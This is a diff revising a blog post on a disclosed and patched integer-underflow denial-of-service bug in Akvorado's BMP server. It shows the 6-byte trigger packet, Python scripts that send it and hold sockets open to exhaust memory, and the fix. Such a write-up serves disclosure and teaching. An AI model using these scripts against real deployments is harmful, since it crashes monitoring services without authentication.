@@ -1,68 +1,60 @@
 ---
 title: "A 6-byte packet exhausts memory in Akvorado's BMP server"
-description: "A single 6-byte packet makes Akvorado's BMP server reserve ~4 GiB, and a few connections crash it. The story of an unauthenticated integer-underflow DoS I found in a tool we run at work. CVSS 7.5, GHSA-wr88-h9r3-fqh3."
+description: "Akvorado's BMP server sizes its body buffer by subtracting the header size from the length field, in unsigned 32-bit arithmetic. Anything under 6 bytes wraps to about 4 GiB, and eight connections killed the process. CVSS 7.5, GHSA-wr88-h9r3-fqh3."
 date: 2026-10-04
 tags:
   - Vulnerability Research
 ---
 
-We run [Akvorado](https://github.com/akvorado/akvorado) at work, and I genuinely
-like it. It is a flow collector and visualizer: it chews through NetFlow, IPFIX and
-sFlow, and we use it to see how much traffic each of our users pulls so we can bill
-them for it. For me it is an everyday tool, the thing I open to answer a question, not
-something I ever expected to end up reporting a vulnerability in.
+We run [Akvorado](https://github.com/akvorado/akvorado) at work. It is a flow
+collector and visualizer: it takes NetFlow, IPFIX and sFlow from our routers and
+turns them into per-user traffic numbers we use for billing. I open it most days
+to answer a question. I did not expect to end up reporting a vulnerability in it.
 
-But I have a habit I cannot switch off. Whenever I use a tool, if I have the time and
-the feeling for it, I start poking at it: clicking the things I am not supposed to,
-reading how it works under the hood, wondering what happens if I feed it something it
-is not expecting. Akvorado learns its routing context over
+What I do expect, whenever I have the time, is to poke at the tools I use: read how
+they parse input, click the paths that are not meant for me, wonder what happens
+with something the tool is not expecting. Akvorado learns routing context over
 [BMP](https://datatracker.ietf.org/doc/html/rfc7854), the BGP Monitoring Protocol,
 which means it runs a server that routers connect to and stream raw binary messages
-into. BMP messages are length-prefixed, and a length-prefixed parser is exactly the
-kind of thing I cannot leave alone. So one afternoon, instead of just using the tool, I
-went reading how it reads.
+into. BMP messages are length-prefixed. A length-prefixed parser is the kind of
+code I cannot leave alone, so one afternoon I stopped using the tool and started
+reading how it reads.
 
-I had a quiet hunch before I even found the line: it is going to trust the length on
-the wire. It did. And the payoff was bigger than I expected. A single 6-byte packet
-makes Akvorado reserve about 4 GiB of memory, and a small handful of connections walk
-the whole process into an out-of-memory crash. No login, no handshake, and the
-listener is on by default. There is a strange feeling in finding something like this
-in software you actually rely on: a little bit of "nice," and a little bit of "oh, we
-run this." The maintainers confirmed it, fixed it, and credited me, so it is all out
-in the open now and I can tell the story.
+The payoff was larger than I expected. One 6-byte packet makes the server reserve
+about 4 GiB of memory, and a handful of connections is enough to crash the process.
+No login, no handshake, and the listener is on by default. Finding something like
+that in software you rely on is a mixed feeling. The maintainers confirmed it, fixed
+it and credited me, so it is public now and I can write it up.
 
 > [!NOTE] TL;DR
-> Akvorado's BMP server reads the 4-byte `Length` field from each message and
-> computes `Length - 6` to size the body buffer, in unsigned 32-bit arithmetic. Any
-> `Length` below 6 underflows to roughly 4.29 billion, so the server tries to
-> allocate ~4 GiB for one tiny packet. `io.ReadFull` then blocks forever waiting
-> for a body that never arrives, pinning that memory. Eight connections reached
-> 34 GiB and the process died. Fix: validate `Length >= 6` before allocating.
+> The BMP read loop takes the 4-byte `Length` field from each message and computes
+> `Length - 6` to size the body buffer, in unsigned 32-bit arithmetic. Any `Length`
+> below 6 underflows to roughly 4.29 billion, so one tiny packet asks for about
+> 4 GiB. `io.ReadFull` then blocks waiting for a body that never arrives, and the
+> allocation stays pinned to the connection. Eight connections reached 34 GiB and
+> the process died. The fix is to reject any length smaller than the header before
+> allocating.
 
 ## One minute on BMP
 
-Quick shout-out before the bytes: most of what I understand about BMP, I owe to our
-network manager at work, who patiently walked me through it more than once while I kept
-asking "wait, but why does it do that." If this next part makes sense, the credit is
-theirs.
+Most of what I understand about BMP, I owe to our network manager, who walked me
+through it more than once while I kept asking why it behaves the way it does.
 
-If you have never touched BMP, here is the only part that matters for this story. It
-is defined in [RFC 7854](https://datatracker.ietf.org/doc/html/rfc7854), and it is how
-a router streams its BGP state to a monitoring station. Every BMP message starts with
-the same 6-byte common header:
+The only part that matters here is the common header, defined in
+[RFC 7854](https://datatracker.ietf.org/doc/html/rfc7854). Every BMP message starts
+with 6 bytes:
 
 - **Version** (1 byte)
-- **Message Length** (4 bytes), the total length of the message including this header
+- **Message Length** (4 bytes), the total length of the message including the header
 - **Message Type** (1 byte)
 
-So a receiver reads those 6 bytes, learns how long the whole message is supposed to
-be, and then reads the rest. The important thing, the thing I keep coming back to, is
-that the length field is attacker-controlled by definition. It is whatever the peer on
-the other end of the TCP connection says it is. You do not get to assume it is honest.
+A receiver reads those 6 bytes, learns how long the whole message should be, and
+reads the rest. The length field is attacker-controlled by definition. It is
+whatever the peer on the other end of the TCP connection says it is.
 
 ## The line that caught my eye
 
-I was skimming the read loop in `outlet/routing/provider/bmp/serve.go`, and then this
+I was skimming the read loop in `outlet/routing/provider/bmp/serve.go` when this
 stopped me:
 
 ```go
@@ -70,19 +62,18 @@ body := make([]byte, msg.Header.Length-bmp.BMP_HEADER_SIZE)
 _, err = io.ReadFull(conn, body) // blocks until `body` is filled
 ```
 
-This is the exact line I go hunting for in any length-prefixed parser: a buffer sized
-straight from a number that came off the wire. Every time I see one, I ask the same two
-questions. What are the boundaries of that value, and does anything check them before
-the code trusts it? I read it twice to be sure I was not missing a guard somewhere
-above. There was no guard. And once I did the arithmetic in my head, the worst case was
-not just bad, it was almost funny.
+A buffer sized straight from a number that came off the wire is the first thing I
+look for in a parser of this shape, and it raises the same two questions every
+time. What are the bounds of that value, and does anything check them before the
+code trusts it? I read the surrounding code twice looking for a guard. There is
+none, and the arithmetic below makes the worst case worse than a plain large
+allocation.
 
-## The trap: subtraction that wraps around
+## Subtraction that wraps
 
-`BMP_HEADER_SIZE` is 6. `msg.Header.Length` is a `uint32`. The code subtracts one from
-the other to get the body size, which is completely fine as long as `Length` is at
-least 6. But unsigned subtraction does not go negative. It wraps. So any length smaller
-than the header underflows to a number near the very top of the 32-bit range:
+`BMP_HEADER_SIZE` is 6 and `msg.Header.Length` is a `uint32`. Subtracting one from
+the other gives the body size, which is correct as long as `Length` is at least 6.
+Unsigned subtraction does not go negative. It wraps:
 
 | `Length` sent | `Length - 6` | Allocation                   |
 |--------------:|--------------|------------------------------|
@@ -90,29 +81,30 @@ than the header underflows to a number near the very top of the 32-bit range:
 | 1             | wraps        | 4,294,967,291 bytes (~4 GiB) |
 | 5             | wraps        | 4,294,967,295 bytes (~4 GiB) |
 
-A `Length` of 0 does not ask for 0 bytes. It asks for about 4 GiB. And here is the part
-that turns a bad allocation into a dependable weapon: because the attacker never sends a
-body, `io.ReadFull` just sits there, blocked forever, waiting. The giant buffer is never
-freed. It stays reserved for the whole lifetime of the connection, and the attacker
-controls that lifetime by doing nothing at all, simply not closing the socket.
+A `Length` of 0 asks for about 4 GiB, not 0 bytes. What turns that into a dependable
+problem rather than a transient one is the next line: because the attacker never
+sends a body, `io.ReadFull` blocks forever waiting for bytes that will not come.
+The buffer is never freed. It stays reserved for the lifetime of the connection, and
+the attacker controls that lifetime by doing nothing, simply by not closing the
+socket.
 
-## Six bytes
+## Six bytes that prove it
 
-I did not want to argue from theory, so I wrote the smallest thing that could prove it.
-The whole exploit is six bytes, and there is no handshake to get through first, because
-the length header is the very first thing the server parses.
+I did not want to argue from theory, so I wrote the smallest thing that could
+demonstrate it. The length header is the first thing the server parses, so the whole
+exploit fits in six bytes and there is no handshake to get past:
 
 ```text
 03 00 00 00 00 04
 ```
 
-Read against the common header:
+Against the common header:
 
-- `03` : BMP version 3, which passes the version check
-- `00 00 00 00` : Length = 0, the underflow trigger
-- `04` : message type (initiation), just needs to be a value the server accepts
+- `03`: BMP version 3, which passes the version check
+- `00 00 00 00`: Length = 0, the underflow trigger
+- `04`: message type (initiation), a value the server accepts
 
-Sending it is three lines:
+Sending it:
 
 ```python
 import socket
@@ -120,11 +112,10 @@ s = socket.create_connection(("outlet-host", 10179))
 s.sendall(bytes.fromhex("030000000004"))
 ```
 
-Each connection that sends this pins roughly 4 GiB and then holds the socket open.
-
-One socket proves the allocation; the crash needs a handful. Since the trick is that
-the attacker does nothing after sending, "scaling" is just keeping the sockets open in a
-list so Python does not garbage-collect them out from under you:
+That pins roughly 4 GiB and holds the socket open. One socket proves the allocation.
+The crash needs a handful, and since the trick is to do nothing after sending,
+"scaling" is just keeping the sockets referenced so Python does not garbage-collect
+them out from under you:
 
 ```python
 import socket, time
@@ -139,35 +130,35 @@ for _ in range(4):
 time.sleep(3600)  # sit here doing nothing; the ~4 GiB per connection stays pinned
 ```
 
-Four connections is ~16 GiB reserved from four 6-byte packets. Point it at a box with
-less headroom, or bump the range, and you are at the out-of-memory line.
+Four connections is about 16 GiB reserved from four 6-byte packets. Point it at a box
+with less headroom, or raise the range, and you are at the out-of-memory line.
 
 ## Watching it fall over
 
-The reason this is a 7.5 and not a footnote is the context around that one line. The BMP
-listener is enabled by default and binds to port `10179` on all interfaces, so on a
-default deployment there is no configuration step and no credential standing between an
-attacker and the bug. In CVSS terms it is `A:H` with `C:N/I:N`: it steals nothing and
-changes nothing, it just takes the service down, completely.
+What makes this a 7.5 rather than a footnote is the context around that one line. The
+BMP listener is enabled by default and binds port `10179` on all interfaces, so on a
+default deployment there is no configuration step and no credential between an
+attacker and the bug. In CVSS terms it is `A:H` with `C:N/I:N`: it takes the service
+down without touching data.
 
-I stood up my own instance and watched it happen, because watching a number climb is a
-lot more convincing than reasoning about it. I kept `htop` open next to the terminal
-I was firing packets from, watching the `VIRT` column for the Akvorado process while I
-opened connections one at a time. Eight was all it took. The virtual memory marched up
-to 34.03 GiB, and then the process fell over with:
+I stood up my own instance and watched it happen, because watching a number climb is
+more convincing than reasoning about it. With `htop` open next to the terminal I was
+firing packets from, I opened connections one at a time and watched the `VIRT` column
+for the Akvorado process. Eight was enough. Virtual memory reached 34.03 GiB and the
+process died with:
 
 ```text
 runtime: out of memory: cannot allocate 4294967296-byte block
 ```
 
-Scaling the attack is not clever. It is just opening more sockets. That is the part that
-sat with me, remembering this is the tool we point at our own traffic every day.
+Scaling the attack is not clever. It is opening more sockets. That is the part that
+sat with me while I remembered this is the tool we point at our own traffic every
+day.
 
 ## The fix
 
-The fix is almost anticlimactic, which is usually how these go: it is the check that
-should have been there all along. Reject any length smaller than the header before you
-use it to size anything.
+The fix is the check that should have been there from the start: reject any length
+smaller than the header before using it to size anything.
 
 ```go
 if msg.Header.Length < bmp.BMP_HEADER_SIZE {
@@ -178,18 +169,18 @@ if msg.Header.Length < bmp.BMP_HEADER_SIZE {
 body := make([]byte, msg.Header.Length-bmp.BMP_HEADER_SIZE)
 ```
 
-It is also worth enforcing a sane upper bound on message size, so that a large but
-technically valid length cannot be turned into a big allocation either. The patch landed
-in [2026.10.0](https://github.com/akvorado/akvorado/releases/tag/v2026.10.0). If you
-expose BMP or IPFIX on an untrusted network, go upgrade before you finish reading this.
+A sane upper bound on message size is worth adding at the same time, so that a large
+but technically valid length cannot be used for a big allocation either. The patch
+landed in [2026.10.0](https://github.com/akvorado/akvorado/releases/tag/v2026.10.0).
+If you expose BMP or IPFIX on an untrusted network, upgrade before you finish reading
+this.
 
 ## Disclosure
 
-I reported this to the Akvorado maintainers, who were quick and kind about it, confirmed
-it, and shipped the fix. I am credited in both the
+I reported this to the Akvorado maintainers, who confirmed it quickly and shipped the
+fix. I am credited in both the
 [advisory](https://github.com/akvorado/akvorado/security/advisories/GHSA-wr88-h9r3-fqh3)
 and the [2026.10.0 release notes](https://github.com/akvorado/akvorado/releases/tag/v2026.10.0).
-Seeing my handle in there is a good feeling, and I will not pretend otherwise.
 
 | Field      | Value                                                                 |
 |------------|-----------------------------------------------------------------------|
@@ -201,21 +192,21 @@ Seeing my handle in there is a good feeling, and I will not pretend otherwise.
 
 ## What I took away
 
-- **Length fields that feed allocations are the first thing I probe.** Before anything
-  clever, I test the boundaries of any size value that came off the wire: zero, values
-  below the header size, and values near the integer maximum. This bug lived at the very
+- **Length fields that feed allocations are where I probe first.** Before anything
+  clever, I test the boundaries of a size value that came off the wire: zero, values
+  below the header size, and values near the integer maximum. This bug lived at the
   smallest input, not the largest.
-- **Unsigned subtraction is a trapdoor.** `a - b` where `a < b` does not error and does
-  not go negative in `uint32`, it wraps to something enormous. Any subtraction on
-  attacker-influenced unsigned values deserves a bounds check first, every single time.
-- **An allocation is only half the primitive.** What made this a reliable crash rather
-  than a transient blip was that `io.ReadFull` blocked and kept the memory pinned. The
-  really damaging resource bugs are the ones where the attacker controls both the size
-  and how long it stays reserved.
-- **Default-on listeners raise the stakes.** The same flaw behind an off-by-default
-  feature is a much smaller deal. This one shipped enabled on all interfaces, and that is
-  most of the distance from "bug" to "unauthenticated remote crash."
+- **Unsigned subtraction is a trapdoor.** `a - b` with `a < b` does not error in
+  `uint32`, it wraps to something enormous. Any subtraction on attacker-influenced
+  unsigned values needs a bounds check first, every time.
+- **An allocation is only half of the primitive.** What made this a reliable crash was
+  that `io.ReadFull` blocked and kept the memory pinned. The damaging resource bugs are
+  the ones where the attacker controls the size and how long it stays reserved.
+- **A default-on listener changes the severity.** The same flaw behind an
+  off-by-default feature would be a much smaller issue. This one shipped enabled on all
+  interfaces, and that is most of the distance between "bug" and "unauthenticated
+  remote crash."
 
-Mostly, though, what stuck with me is how ordinary the setup was. I was not fuzzing
-anything exotic. I was reading a tool I already trusted, following a habit, and the bug
-was sitting right there in plain sight. That is the part that keeps this fun for me.
+What stayed with me is how ordinary the setup was. I was not fuzzing anything exotic.
+I was reading a tool I already trusted, following a habit, and the bug was sitting in
+plain sight.
